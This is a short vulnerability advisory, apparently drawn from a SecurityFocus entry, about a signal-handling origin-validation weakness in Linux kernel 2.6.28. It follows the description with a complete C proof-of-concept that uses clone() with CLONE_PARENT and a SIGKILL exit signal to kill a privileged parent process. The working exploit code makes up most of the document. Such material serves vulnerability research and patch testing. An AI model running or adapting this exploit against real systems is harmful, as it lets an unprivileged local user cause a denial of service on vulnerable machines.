source: http://www.securityfocus.com/bid/33906/info

The Linux kernel is prone to an origin-validation weakness when dealing with signal handling.

This weakness occurs when a privileged process calls attacker-supplied processes as children. Attackers may exploit this to send arbitrary signals to the privileged parent process.

A local attacker may exploit this issue to kill vulnerable processes, resulting in a denial-of-service condition. In some cases, other attacks may also be possible.

Linux kernel 2.6.28 is vulnerable; other versions may also be affected. 

#include <sched.h>
#include <signal.h>
#include <stdlib.h>
#include <unistd.h>

static int the_child(void* arg) {
  sleep(1);
  _exit(2);
}

int main(int argc, const char* argv[]) {
  int ret = fork();
  if (ret < 0)
  {
    perror("fork");
    _exit(1);
  }
  else if (ret > 0)
  {
    for (;;);
  }
  setgid(99);
  setuid(65534);
  {
    int status;
    char* stack = malloc(4096);
    int flags = SIGKILL | CLONE_PARENT;
    int child = clone(the_child, stack + 4096, flags, NULL);
  }
  _exit(100);
}
